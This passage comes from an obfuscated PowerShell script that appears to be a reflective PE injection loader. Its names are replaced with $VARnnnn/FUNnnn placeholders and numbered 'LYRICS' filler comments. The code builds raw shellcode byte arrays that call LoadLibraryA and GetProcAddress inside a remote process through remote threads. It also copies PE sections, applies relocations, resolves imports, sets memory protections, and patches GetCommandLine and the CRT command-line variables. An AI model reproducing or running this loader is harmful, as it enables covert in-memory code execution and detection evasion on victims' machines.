            $VAR0169 = $VAR0042.FUN036.Invoke($VAR0168, "LoadLibraryA") 
# LYRICS515
            [IntPtr]$VAR0181 = $VAR095::Zero
# LYRICS516
# LYRICS517
            if ($VAR0126.CONST032 -eq $true) {
# LYRICS518
                $VAR0170 = $VAR0042.FUN032.Invoke($VAR0161, $VAR095::Zero, $VAR0165, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
# LYRICS519
                if ($VAR0170 -eq $VAR095::Zero) {
                    Throw "ERROR12"
                }
# LYRICS520
                [Byte[]]$VAR0174 = 83,72,137,227,72,131,236,32,102,131,228,192,72,185
# LYRICS521
                $VAR0175 = 72,186
                $VAR0176 = 255,210,72,186
# LYRICS522
                $VAR0177 = 72,137,2,72,137,220,91,195
# LYRICS523
                $VAR0171 = $VAR0174.Length + $VAR0175.Length + $VAR0176.Length + $VAR0177.Length + ($VAR0163 * 3)
# LYRICS524
                $VAR0172 = $VAR099::AllocHGlobal($VAR0171)
                $VAR0173 = $VAR0172
# LYRICS525
                FUN010 -Bytes $VAR0174 -VAR0129 $VAR0172
# LYRICS526
                $VAR0172 = FUN005 $VAR0172 ($VAR0174.Length)
                $VAR099::StructureToPtr($VAR0166, $VAR0172, $false)
                $VAR0172 = FUN005 $VAR0172 ($VAR0163)
# LYRICS527
                FUN010 -Bytes $VAR0175 -VAR0129 $VAR0172
                $VAR0172 = FUN005 $VAR0172 ($VAR0175.Length)
# LYRICS528
                $VAR099::StructureToPtr($VAR0169, $VAR0172, $false)
                $VAR0172 = FUN005 $VAR0172 ($VAR0163)
# LYRICS529
                FUN010 -Bytes $VAR0176 -VAR0129 $VAR0172
                $VAR0172 = FUN005 $VAR0172 ($VAR0176.Length)
                $VAR099::StructureToPtr($VAR0170, $VAR0172, $false)
                $VAR0172 = FUN005 $VAR0172 ($VAR0163)
                FUN010 -Bytes $VAR0177 -VAR0129 $VAR0172
# LYRICS530
                $VAR0172 = FUN005 $VAR0172 ($VAR0177.Length)
# LYRICS531
                $VAR0178 = $VAR0042.FUN032.Invoke($VAR0161, $VAR095::Zero, [UIntPtr][UInt64]$VAR0171, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST008)
# LYRICS532
                if ($VAR0178 -eq $VAR095::Zero) {
# LYRICS533
                    Throw "ERROR13"
                }
# LYRICS534
                $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0178, $VAR0173, [UIntPtr][UInt64]$VAR0171, [Ref]$VAR0167)
# LYRICS535
                if (($Success -eq $false) -or ([UInt64]$VAR0167 -ne [UInt64]$VAR0171)) {
                    Throw "ERROR14"
                }
# LYRICS536
                $VAR0179 = FUN014 -VAR0151 $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
# LYRICS537
                $VAR0144 = $VAR0042.FUN044.Invoke($VAR0179, 20000)
                if ($VAR0144 -ne 0) {
                    Throw "ERROR15"
                }
# LYRICS538
# LYRICS539
                [IntPtr]$VAR0180 = $VAR099::AllocHGlobal($VAR0163)
                $VAR0144 = $VAR0042.FUN046.Invoke($VAR0161, $VAR0170, $VAR0180, [UIntPtr][UInt64]$VAR0163, [Ref]$VAR0167)
# LYRICS540
                if ($VAR0144 -eq $false) {
                    Throw "ERROR16"
                }
                [IntPtr]$VAR0181 = $VAR099::PtrToStructure($VAR0180, [Type][IntPtr])
# LYRICS541
                $VAR0042.FUN039.Invoke($VAR0161, $VAR0170, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
# LYRICS542
                $VAR0042.FUN039.Invoke($VAR0161, $VAR0178, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
            }
            else {
# LYRICS543
                [IntPtr]$VAR0179 = FUN014 -VAR0151 $VAR0161 -VAR0127 $VAR0169 -VAR0152 $VAR0166 -VAR0042 $VAR0042
# LYRICS544
                $VAR0144 = $VAR0042.FUN044.Invoke($VAR0179, 20000)
                if ($VAR0144 -ne 0) {
                    Throw "ERROR17."
                }
# LYRICS545
                [Int32]$VAR0182 = 0
# LYRICS546
                $VAR0144 = $VAR0042.FUN048.Invoke($VAR0179, [Ref]$VAR0182)
# LYRICS547
                if (($VAR0144 -eq 0) -or ($VAR0182 -eq 0)) {
                    Throw "ERROR18"
                }
# LYRICS548
                [IntPtr]$VAR0181 = [IntPtr]$VAR0182
            }
# LYRICS549
            $VAR0042.FUN039.Invoke($VAR0161, $VAR0166, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
# LYRICS550
            return $VAR0181
        }
# LYRICS551
        Function FUN019 {
# LYRICS552
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [IntPtr]
                $VAR0161,
# LYRICS553
                [Parameter(Position = 1, Mandatory = $true)]
                [IntPtr]
                $VAR0183,
# LYRICS554
                [Parameter(Position = 2, Mandatory = $true)]
                [IntPtr]
                $VAR0184, 
# LYRICS555
                [Parameter(Position = 3, Mandatory = $true)]
                [Bool]
                $VAR0185
            )
# LYRICS556
            $VAR0163 = $VAR099::SizeOf([Type][IntPtr])
# LYRICS557
            [IntPtr]$VAR0186 = [IntPtr]::Zero   
# LYRICS558
            if (-not $VAR0185) {
# LYRICS559
                $VAR0187 = $VAR099::PtrToStringAnsi($VAR0184)
# LYRICS560
# LYRICS561
# LYRICS562
                $VAR0188 = [UIntPtr][UInt64]([UInt64]$VAR0187.Length + 1)
# LYRICS563
                $VAR0186 = $VAR0042.FUN032.Invoke($VAR0161, $VAR095::Zero, $VAR0188, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
# LYRICS564
                if ($VAR0186 -eq $VAR095::Zero) {
                    Throw "ERROR17"
                }
# LYRICS565
                [UIntPtr]$VAR0167 = [UIntPtr]::Zero
# LYRICS566
                $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0186, $VAR0184, $VAR0188, [Ref]$VAR0167)
# LYRICS567
                if ($Success -eq $false) {
                    Throw "ERROR18"
                }
                if ($VAR0188 -ne $VAR0167) {
                    Throw "ERROR19"
                }
            }
# LYRICS568
            else {
                $VAR0186 = $VAR0184
            }
# LYRICS569
# LYRICS570
            $VAR0168 = $VAR0042.FUN041.Invoke($VAR0302)
# LYRICS571
            $VAR0058 = $VAR0042.FUN036.Invoke($VAR0168, $VAR0312) 
# LYRICS572
# LYRICS573
            $VAR0189 = $VAR0042.FUN032.Invoke($VAR0161, $VAR095::Zero, [UInt64][UInt64]$VAR0163, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
# LYRICS574
            if ($VAR0189 -eq $VAR095::Zero) {
# LYRICS575
                Throw "ERROR20"
            }
# LYRICS576
# LYRICS577
# LYRICS578
            [Byte[]]$VAR0190 = @()
            if ($VAR0126.CONST032 -eq $true) {
                $VAR01901 = 83,72,137,227,72,131,236,32,102,131,228,192,72,185
# LYRICS579
                $VAR01902 = 72,186
                $VAR01903 = 72,184
# LYRICS580
                $VAR01904 = 255,208,72,185
                $VAR01905 = 72,137,1,72,137,220,91,195
            }
            else {
                $VAR01901 = 83,137,227,131,228,192,184
                $VAR01902 = 185
# LYRICS581
                $VAR01903 = 81,80,184
# LYRICS582
                $VAR01904 = 255,208,185
                $VAR01905 = 137,1,137,220,91,195
            }
            $VAR0171 = $VAR01901.Length + $VAR01902.Length + $VAR01903.Length + $VAR01904.Length + $VAR01905.Length + ($VAR0163 * 4)
# LYRICS583
            $VAR0172 = $VAR099::AllocHGlobal($VAR0171)
            $VAR0173 = $VAR0172
# LYRICS584
            FUN010 -Bytes $VAR01901 -VAR0129 $VAR0172
            $VAR0172 = FUN005 $VAR0172 ($VAR01901.Length)
# LYRICS585
            $VAR099::StructureToPtr($VAR0183, $VAR0172, $false)
            $VAR0172 = FUN005 $VAR0172 ($VAR0163)
# LYRICS586
            FUN010 -Bytes $VAR01902 -VAR0129 $VAR0172
            $VAR0172 = FUN005 $VAR0172 ($VAR01902.Length)
# LYRICS587
            $VAR099::StructureToPtr($VAR0186, $VAR0172, $false)
            $VAR0172 = FUN005 $VAR0172 ($VAR0163)
            FUN010 -Bytes $VAR01903 -VAR0129 $VAR0172
            $VAR0172 = FUN005 $VAR0172 ($VAR01903.Length)
# LYRICS588
            $VAR099::StructureToPtr($VAR0058, $VAR0172, $false)
            $VAR0172 = FUN005 $VAR0172 ($VAR0163)
            FUN010 -Bytes $VAR01904 -VAR0129 $VAR0172
# LYRICS589
            $VAR0172 = FUN005 $VAR0172 ($VAR01904.Length)
            $VAR099::StructureToPtr($VAR0189, $VAR0172, $false)
# LYRICS590
            $VAR0172 = FUN005 $VAR0172 ($VAR0163)
            FUN010 -Bytes $VAR01905 -VAR0129 $VAR0172
            $VAR0172 = FUN005 $VAR0172 ($VAR01905.Length)
# LYRICS591
            $VAR0178 = $VAR0042.FUN032.Invoke($VAR0161, $VAR095::Zero, [UIntPtr][UInt64]$VAR0171, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST008)
# LYRICS592
            if ($VAR0178 -eq $VAR095::Zero) {
                Throw "ERROR21"
            }
            [UIntPtr]$VAR0167 = [UIntPtr]::Zero
# LYRICS593
            $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0178, $VAR0173, [UIntPtr][UInt64]$VAR0171, [Ref]$VAR0167)
# LYRICS594
            if (($Success -eq $false) -or ([UInt64]$VAR0167 -ne [UInt64]$VAR0171)) {
                Throw "ERROR22"
            }
# LYRICS595
            $VAR0179 = FUN014 -VAR0151 $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
# LYRICS596
            $VAR0144 = $VAR0042.FUN044.Invoke($VAR0179, 20000)
            if ($VAR0144 -ne 0) {
                Throw "ERROR23"
            }
# LYRICS597
# LYRICS598
            [IntPtr]$VAR0180 = $VAR099::AllocHGlobal($VAR0163)
# LYRICS599
            $VAR0144 = $VAR0042.FUN046.Invoke($VAR0161, $VAR0189, $VAR0180, [UIntPtr][UInt64]$VAR0163, [Ref]$VAR0167)
# LYRICS600
            if (($VAR0144 -eq $false) -or ($VAR0167 -eq 0)) {
                Throw "ERROR24"
            }
            [IntPtr]$VAR0191 = $VAR099::PtrToStructure($VAR0180, [Type][IntPtr])
# LYRICS601
# LYRICS602
            $VAR0042.FUN039.Invoke($VAR0161, $VAR0178, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
# LYRICS603
            $VAR0042.FUN039.Invoke($VAR0161, $VAR0189, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
# LYRICS604
            if (-not $VAR0185) {
# LYRICS605
                $VAR0042.FUN039.Invoke($VAR0161, $VAR0186, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
            }
# LYRICS606
            return $VAR0191
        }
# LYRICS607
# LYRICS608
        Function FUN020 {
# LYRICS609
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [Byte[]]
                $VAR001,
# LYRICS610
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR0126,
# LYRICS611
                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $VAR0042,
# LYRICS612
                [Parameter(Position = 3, Mandatory = $true)]
                [System.Object]
                $VAR010
            )
# LYRICS613
            for ( $i = 0; $i -lt $VAR0126.CONST031.CONST121.CONST072; $i++) {
# LYRICS614
                [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.CONST036) ($i * $VAR099::SizeOf([Type]$VAR010.CONST142)))
                $VAR0192 = $VAR099::PtrToStructure($VAR0160, [Type]$VAR010.CONST142)
# LYRICS615
# LYRICS616
# LYRICS617
                [IntPtr]$VAR0193 = [IntPtr](FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0192.CONST074))
# LYRICS618
# LYRICS619
# LYRICS620
# LYRICS621
# LYRICS622
                $VAR0194 = $VAR0192.CONST144
# LYRICS623
                if ($VAR0192.CONST145 -eq 0) {
# LYRICS624
                    $VAR0194 = 0
                }
# LYRICS625
                if ($VAR0194 -gt $VAR0192.CONST143) {
# LYRICS626
                    $VAR0194 = $VAR0192.CONST143
                }
# LYRICS627
                if ($VAR0194 -gt 0) {
                    FUN009 -VAR0125 "FUN020::MarshalCopy" -VAR0126 $VAR0126 -VAR0127 $VAR0193 -Size $VAR0194 | Out-Null
# LYRICS628
                    $VAR099::Copy($VAR001, [Int32]$VAR0192.CONST145, $VAR0193, $VAR0194)
# LYRICS629
                }
# LYRICS630
# LYRICS631
                if ($VAR0192.CONST144 -lt $VAR0192.CONST143) {
                    $VAR0195 = $VAR0192.CONST143 - $VAR0194
# LYRICS632
                    [IntPtr]$VAR0127 = [IntPtr](FUN005 ([Int64]$VAR0193) ([Int64]$VAR0194))
# LYRICS633
                    FUN009 -VAR0125 "FUN020::FUN034" -VAR0126 $VAR0126 -VAR0127 $VAR0127 -Size $VAR0195 | Out-Null
# LYRICS634
                    $VAR0042.FUN034.Invoke($VAR0127, 0, [IntPtr]$VAR0195) | Out-Null
                }
            }
        }
# LYRICS635
# LYRICS636
        Function FUN021 {
# LYRICS637
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [System.Object]
                $VAR0126,
# LYRICS638
                [Parameter(Position = 1, Mandatory = $true)]
                [Int64]
                $VAR0196,
# LYRICS639
                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $VAR0041,
# LYRICS640
                [Parameter(Position = 3, Mandatory = $true)]
                [System.Object]
                $VAR010
            )
# LYRICS641
            [Int64]$VAR0197 = 0
# LYRICS642
            $VAR0198 = $true 
# LYRICS643
            [UInt32]$VAR0199 = $VAR099::SizeOf([Type]$VAR010.CONST150)
# LYRICS644
# LYRICS645
            if (($VAR0196 -eq [Int64]$VAR0126.CONST039) `
                    -or ($VAR0126.CONST031.CONST122.CONST112.Size -eq 0)) {
# LYRICS646
                return
            }
# LYRICS647
# LYRICS648
            elseif ((FUN006 ($VAR0196) ($VAR0126.CONST039)) -eq $true) {
# LYRICS649
                $VAR0197 = FUN004 ($VAR0196) ($VAR0126.CONST039)
                $VAR0198 = $false
            }
            elseif ((FUN006 ($VAR0126.CONST039) ($VAR0196)) -eq $true) {
# LYRICS650
                $VAR0197 = FUN004 ($VAR0126.CONST039) ($VAR0196)
            }
# LYRICS651
# LYRICS652
            [IntPtr]$VAR0200 = [IntPtr](FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0126.CONST031.CONST122.CONST112.CONST074))
# LYRICS653
            while ($true) {
# LYRICS654
                $VAR0201 = $VAR099::PtrToStructure($VAR0200, [Type]$VAR010.CONST150)
# LYRICS655
                if ($VAR0201.CONST151 -eq 0) {
                    break
                }
# LYRICS656
                [IntPtr]$VAR0202 = [IntPtr](FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0201.CONST074))
# LYRICS657
                $VAR0203 = ($VAR0201.CONST151 - $VAR0199) / 2
# LYRICS658
# LYRICS659
                for ($i = 0; $i -lt $VAR0203; $i++) {
# LYRICS660
                    $VAR0204 = [IntPtr](FUN005 ([IntPtr]$VAR0200) ([Int64]$VAR0199 + (2 * $i)))
# LYRICS661
                    [UInt16]$VAR0205 = $VAR099::PtrToStructure($VAR0204, [Type][UInt16])
# LYRICS662
# LYRICS663
                    [UInt16]$VAR0206 = $VAR0205 -band 0x0FFF
# LYRICS664
                    [UInt16]$VAR0207 = $VAR0205 -band 0xF000
                    for ($j = 0; $j -lt 12; $j++) {
                        $VAR0207 = [Math]::Floor($VAR0207 / 2)
                    }
# LYRICS665
# LYRICS666
# LYRICS667
# LYRICS668
                    if (($VAR0207 -eq $VAR0041.CONST013) `
                            -or ($VAR0207 -eq $VAR0041.CONST014)) {
# LYRICS669
# LYRICS670
                        [IntPtr]$VAR0208 = [IntPtr](FUN005 ([Int64]$VAR0202) ([Int64]$VAR0206))
# LYRICS671
                        [IntPtr]$VAR0209 = $VAR099::PtrToStructure($VAR0208, [Type][IntPtr])
# LYRICS672
                        if ($VAR0198 -eq $true) {
# LYRICS673
                            [IntPtr]$VAR0209 = [IntPtr](FUN005 ([Int64]$VAR0209) ($VAR0197))
                        }
                        else {
# LYRICS674
                            [IntPtr]$VAR0209 = [IntPtr](FUN004 ([Int64]$VAR0209) ($VAR0197))
                        }
# LYRICS675
                        $VAR099::StructureToPtr($VAR0209, $VAR0208, $false) | Out-Null
                    }
                    elseif ($VAR0207 -ne $VAR0041.CONST012) {
# LYRICS676
                        Throw "ERROR25: $VAR0207, ERROR26: $VAR0205"
                    }
                }
# LYRICS677
                $VAR0200 = [IntPtr](FUN005 ([Int64]$VAR0200) ([Int64]$VAR0201.CONST151))
            }
        }
# LYRICS678
# LYRICS679
        Function FUN022 {
# LYRICS680
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [System.Object]
                $VAR0126,
# LYRICS681
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR0042,
# LYRICS682
                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $VAR010,
# LYRICS683
                [Parameter(Position = 3, Mandatory = $true)]
                [System.Object]
                $VAR0041,
# LYRICS684
                [Parameter(Position = 4, Mandatory = $false)]
                [IntPtr]
                $VAR0161
            )
# LYRICS685
            $VAR0210 = $false
            if ($VAR0126.VAR0263 -ne $VAR0126.CONST039) {
# LYRICS686
                $VAR0210 = $true
            }
# LYRICS687
            if ($VAR0126.CONST031.CONST122.CONST108.Size -gt 0) {
# LYRICS688
                [IntPtr]$VAR0211 = FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0126.CONST031.CONST122.CONST108.CONST074)
# LYRICS689
                while ($true) {
# LYRICS690
                    $VAR0212 = $VAR099::PtrToStructure($VAR0211, [Type]$VAR010.CONST152)
# LYRICS691
# LYRICS692
                    if ($VAR0212.CONST067 -eq 0 `
                            -and $VAR0212.CONST154 -eq 0 `
                            -and $VAR0212.CONST153 -eq 0 `
                            -and $VAR0212.Name -eq 0 `
                            -and $VAR0212.CONST071 -eq 0) {
# LYRICS693
                        break
                    }
# LYRICS694
                    $VAR0213 = $VAR095::Zero
# LYRICS695
                    $VAR0162 = (FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0212.Name))
                    $VAR0164 = $VAR099::PtrToStringAnsi($VAR0162)
# LYRICS696
# LYRICS697
                    if ($VAR0210 -eq $true) {
# LYRICS698
                        $VAR0213 = FUN018 -VAR0161 $VAR0161 -VAR0162 $VAR0162
                    }
                    else {
                        $VAR0213 = $VAR0042.FUN035.Invoke($VAR0164)
# LYRICS699
                    }
# LYRICS700
                    if (($VAR0213 -eq $null) -or ($VAR0213 -eq $VAR095::Zero)) {
# LYRICS701
                        throw "ERROR28: $VAR0164"
                    }
# LYRICS702
# LYRICS703
                    [IntPtr]$VAR0214 = FUN005 ($VAR0126.VAR0263) ($VAR0212.CONST154)
# LYRICS704
                    [IntPtr]$VAR0215 = FUN005 ($VAR0126.VAR0263) ($VAR0212.CONST067) 
# LYRICS705
                    [IntPtr]$VAR0216 = $VAR099::PtrToStructure($VAR0215, [Type][IntPtr])
# LYRICS706
                    while ($VAR0216 -ne $VAR095::Zero) {
# LYRICS707
                        $VAR0185 = $false
                        [IntPtr]$VAR0217 = $VAR095::Zero
# LYRICS708
# LYRICS709
# LYRICS710
                        [IntPtr]$VAR0218 = $VAR095::Zero
# LYRICS711
                        if ($VAR099::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$VAR0216 -lt 0) {
                            [IntPtr]$VAR0217 = [IntPtr]$VAR0216 -band 0xffff 
                            $VAR0185 = $true
# LYRICS712
                        }
                        elseif ($VAR099::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$VAR0216 -lt 0) {
# LYRICS713
                            [IntPtr]$VAR0217 = [Int64]$VAR0216 -band 0xffff 
                            $VAR0185 = $true
                        }
                        else {
                            [IntPtr]$VAR0219 = FUN005 ($VAR0126.VAR0263) ($VAR0216)
# LYRICS714
                            $VAR0219 = FUN005 $VAR0219 ($VAR099::SizeOf([Type][UInt16]))
                            $VAR0220 = $VAR099::PtrToStringAnsi($VAR0219)
# LYRICS715
                            $VAR0217 = $VAR099::StringToHGlobalAnsi($VAR0220)
                        }
# LYRICS716
                        if ($VAR0210 -eq $true) {
# LYRICS717
                            [IntPtr]$VAR0218 = FUN019 -VAR0161 $VAR0161 -VAR0183 $VAR0213 -VAR0184 $VAR0217 -VAR0185 $VAR0185
                        }
                        else {
                            [IntPtr]$VAR0218 = $VAR0042.FUN037.Invoke($VAR0213, $VAR0217)
                        }
# LYRICS718
                        if ($VAR0218 -eq $null -or $VAR0218 -eq $VAR095::Zero) {
# LYRICS719
                            if ($VAR0185) {
                                Throw "ERROR30: $VAR0217 $VAR0164"
                            }
                            else {
                                Throw "ERROR31: $VAR0220 $VAR0164"
                            }
                        }
# LYRICS720
                        $VAR099::StructureToPtr($VAR0218, $VAR0214, $false)
# LYRICS721
                        $VAR0214 = FUN005 ([Int64]$VAR0214) ($VAR099::SizeOf([Type][IntPtr]))
# LYRICS722
                        [IntPtr]$VAR0215 = FUN005 ([Int64]$VAR0215) ($VAR099::SizeOf([Type][IntPtr]))
# LYRICS723
                        [IntPtr]$VAR0216 = $VAR099::PtrToStructure($VAR0215, [Type][IntPtr])
# LYRICS724
# LYRICS725
# LYRICS726
                        if ((-not $VAR0185) -and ($VAR0217 -ne $VAR095::Zero)) {
# LYRICS727
                            $VAR099::FreeHGlobal($VAR0217)
                            $VAR0217 = $VAR095::Zero
                        }
                    }
# LYRICS728
                    $VAR0211 = FUN005 ($VAR0211) ($VAR099::SizeOf([Type]$VAR010.CONST152))
                }
            }
        }
# LYRICS729
        Function FUN023 {
# LYRICS730
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [UInt32]
                $VAR0221
            )
# LYRICS731
            $VAR0222 = 0x0
            if (($VAR0221 -band $VAR0041.CONST016) -gt 0) {
# LYRICS732
                if (($VAR0221 -band $VAR0041.CONST017) -gt 0) {
# LYRICS733
                    if (($VAR0221 -band $VAR0041.CONST018) -gt 0) {
                        $VAR0222 = $VAR0041.CONST008
                    }
                    else {
                        $VAR0222 = $VAR0041.CONST009
                    }
                }
                else {
                    if (($VAR0221 -band $VAR0041.CONST018) -gt 0) {
# LYRICS734
                        $VAR0222 = $VAR0041.CONST010
                    }
                    else {
                        $VAR0222 = $VAR0041.CONST007
                    }
                }
            }
            else {
                if (($VAR0221 -band $VAR0041.CONST017) -gt 0) {
                    if (($VAR0221 -band $VAR0041.CONST018) -gt 0) {
# LYRICS735
                        $VAR0222 = $VAR0041.CONST005
                    }
                    else {
                        $VAR0222 = $VAR0041.CONST004
                    }
                }
                else {
                    if (($VAR0221 -band $VAR0041.CONST018) -gt 0) {
# LYRICS736
                        $VAR0222 = $VAR0041.CONST006
                    }
                    else {
                        $VAR0222 = $VAR0041.CONST003
# LYRICS737
                    }
                }
            }
# LYRICS738
            if (($VAR0221 -band $VAR0041.CONST019) -gt 0) {
# LYRICS739
                $VAR0222 = $VAR0222 -bor $VAR0041.CONST011
            }
# LYRICS740
            return $VAR0222
        }
# LYRICS741
        Function FUN024 {
# LYRICS742
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [System.Object]
                $VAR0126,
# LYRICS743
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR0042,
# LYRICS744
                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $VAR0041,
# LYRICS745
                [Parameter(Position = 3, Mandatory = $true)]
                [System.Object]
                $VAR010
            )
# LYRICS746
# LYRICS747
            for ( $i = 0; $i -lt $VAR0126.CONST031.CONST121.CONST072; $i++) {
# LYRICS748
                [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.CONST036) ($i * $VAR099::SizeOf([Type]$VAR010.CONST142)))
# LYRICS749
                $VAR0192 = $VAR099::PtrToStructure($VAR0160, [Type]$VAR010.CONST142)
# LYRICS750
                [IntPtr]$VAR0223 = FUN005 ($VAR0126.VAR0263) ($VAR0192.CONST074)
# LYRICS751
                [UInt32]$VAR0224 = FUN023 $VAR0192.CONST067
                [UInt32]$VAR0225 = $VAR0192.CONST143
# LYRICS752
                [UInt32]$VAR0226 = 0
                FUN009 -VAR0125 "FUN024::FUN040" -VAR0126 $VAR0126 -VAR0127 $VAR0223 -Size $VAR0225 | Out-Null
# LYRICS753
                $Success = $VAR0042.FUN040.Invoke($VAR0223, $VAR0225, $VAR0224, [Ref]$VAR0226)
                if ($Success -eq $false) {
                    Throw "ERROR32"
                }
            }
        }
# LYRICS754
# LYRICS755
# LYRICS756
        Function FUN025 {
# LYRICS757
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [System.Object]
                $VAR0126,
# LYRICS758
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR0042,
# LYRICS759
                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $VAR0041,
# LYRICS760
                [Parameter(Position = 3, Mandatory = $true)]
                [String]
                $VAR0227,
# LYRICS761
                [Parameter(Position = 4, Mandatory = $true)]
                [IntPtr]
                $VAR0228
            )
# LYRICS762
# LYRICS763
            $VAR0229 = @()
# LYRICS764
            $VAR0163 = $VAR099::SizeOf([Type][IntPtr])
# LYRICS765
            [UInt32]$VAR0226 = 0
# LYRICS766
            [IntPtr]$VAR0168 = $VAR0042.FUN041.Invoke($VAR0302)
            if ($VAR0168 -eq $VAR095::Zero) {
                throw "ERROR33"
            }
# LYRICS767
            [IntPtr]$VAR0230 = $VAR0042.FUN041.Invoke("KernelBase.dll")
# LYRICS768
            if ($VAR0230 -eq $VAR095::Zero) {
                throw "ERROR34"
            }
# LYRICS769
# LYRICS770
# LYRICS771
# LYRICS772
            $VAR0231 = $VAR099::StringToHGlobalUni($VAR0227)
# LYRICS773
            $VAR0232 = $VAR099::StringToHGlobalAnsi($VAR0227)
# LYRICS774
            [IntPtr]$VAR0233 = $VAR0042.FUN036.Invoke($VAR0230, "GetCommandLineA")
# LYRICS775
            [IntPtr]$VAR0234 = $VAR0042.FUN036.Invoke($VAR0230, "GetCommandLineW")
# LYRICS776
            if ($VAR0233 -eq $VAR095::Zero -or $VAR0234 -eq $VAR095::Zero) {
# LYRICS777
                throw "ERROR36: $(FUN008 $VAR0233). ERROR37: $(FUN008 $VAR0234)"
            }
# LYRICS778
# LYRICS779
            [Byte[]]$VAR0235 = @()
# LYRICS780
            if ($VAR0163 -eq 8) {
# LYRICS781
                $VAR0235 += 0x48 
            }
            $VAR0235 += 0xb8
# LYRICS782
            [Byte[]]$VAR0236 = 195
            $VAR0237 = $VAR0235.Length + $VAR0163 + $VAR0236.Length
# LYRICS783
# LYRICS784
            $VAR0238 = $VAR099::AllocHGlobal($VAR0237)
# LYRICS785
            $VAR0239 = $VAR099::AllocHGlobal($VAR0237)
            $VAR0042.FUN033.Invoke($VAR0238, $VAR0233, [UInt64]$VAR0237) | Out-Null
            $VAR0042.FUN033.Invoke($VAR0239, $VAR0234, [UInt64]$VAR0237) | Out-Null
# LYRICS786
            $VAR0229 += , ($VAR0233, $VAR0238, $VAR0237)
# LYRICS787
            $VAR0229 += , ($VAR0234, $VAR0239, $VAR0237)
# LYRICS788
# LYRICS789
# LYRICS790
            [UInt32]$VAR0226 = 0
            $Success = $VAR0042.FUN040.Invoke($VAR0233, [UInt32]$VAR0237, [UInt32]($VAR0041.CONST008), [Ref]$VAR0226)
# LYRICS791
            if ($Success = $false) {
                throw "ERROR39"
            }
# LYRICS792
            $VAR0240 = $VAR0233
            FUN010 -Bytes $VAR0235 -VAR0129 $VAR0240
# LYRICS793
            $VAR0240 = FUN005 $VAR0240 ($VAR0235.Length)
            $VAR099::StructureToPtr($VAR0232, $VAR0240, $false)
# LYRICS794
            $VAR0240 = FUN005 $VAR0240 $VAR0163
# LYRICS795
            FUN010 -Bytes $VAR0236 -VAR0129 $VAR0240
# LYRICS796
            $VAR0042.FUN040.Invoke($VAR0233, [UInt32]$VAR0237, [UInt32]$VAR0226, [Ref]$VAR0226) | Out-Null
# LYRICS797
# LYRICS798
# LYRICS799
            [UInt32]$VAR0226 = 0
            $Success = $VAR0042.FUN040.Invoke($VAR0234, [UInt32]$VAR0237, [UInt32]($VAR0041.CONST008), [Ref]$VAR0226)
# LYRICS800
            if ($Success = $false) {
                throw "ERROR40"
            }
# LYRICS801
            $VAR0234Temp = $VAR0234
# LYRICS802
            FUN010 -Bytes $VAR0235 -VAR0129 $VAR0234Temp
            $VAR0234Temp = FUN005 $VAR0234Temp ($VAR0235.Length)
# LYRICS803
            $VAR099::StructureToPtr($VAR0231, $VAR0234Temp, $false)
# LYRICS804
            $VAR0234Temp = FUN005 $VAR0234Temp $VAR0163
# LYRICS805
            FUN010 -Bytes $VAR0236 -VAR0129 $VAR0234Temp
# LYRICS806
            $VAR0042.FUN040.Invoke($VAR0234, [UInt32]$VAR0237, [UInt32]$VAR0226, [Ref]$VAR0226) | Out-Null
# LYRICS807
# LYRICS808
# LYRICS809
# LYRICS810
# LYRICS811
# LYRICS812
# LYRICS813
            $VAR0241 = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
                    , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll", "msvcr120.dll", "msvcrt.dll")
# LYRICS814
            foreach ($VAR0242 in $VAR0241) {
# LYRICS815
                [IntPtr]$VAR0243 = $VAR0042.FUN041.Invoke($VAR0242)
                if ($VAR0243 -ne $VAR095::Zero) {
# LYRICS816
                    [IntPtr]$VAR0244 = $VAR0042.FUN036.Invoke($VAR0243, "_wcmdln")
# LYRICS817
